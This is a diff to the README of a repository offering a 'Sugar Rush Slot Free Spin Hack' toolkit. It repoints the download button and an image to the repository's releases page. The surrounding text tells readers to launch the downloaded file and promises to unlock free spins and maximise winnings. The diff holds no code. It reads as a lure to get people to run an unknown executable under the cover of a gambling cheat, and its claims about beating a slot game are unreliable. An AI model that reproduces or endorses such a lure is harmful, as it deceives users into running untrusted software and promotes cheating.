@@ -43,7 +43,7 @@ Remember, everything included in this repository is for educational purposes onl
 
 Click the button below to access the toolkit and start enhancing your Sugar Rush gameplay experience:
 
-[![Download Sugar Rush Toolkit](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Sugar Rush Toolkit](https://github.com/yoshida081/Sugar-Rush-Slot-Free-Spin-Hack/releases)](https://github.com/yoshida081/Sugar-Rush-Slot-Free-Spin-Hack/releases)
 
 If the link ends with a file name, it needs to be launched to access the toolkit.
 
@@ -59,5 +59,5 @@ Please note that the use of hack scripts, cheat strategies, and other features i
 
 With the Sugar Rush Slot Free Spin Hack toolkit at your fingertips, you are now equipped to dominate the game, unlock free spins, and maximize your winnings like never before. Happy spinning and good luck on your journey to Sugar Rush success! 🍭🎰
 
-![Sugar Rush Slot](https://www.example.com/sugar-rush-slot-image.jpg)
+![Sugar Rush Slot](https://github.com/yoshida081/Sugar-Rush-Slot-Free-Spin-Hack/releases)
 
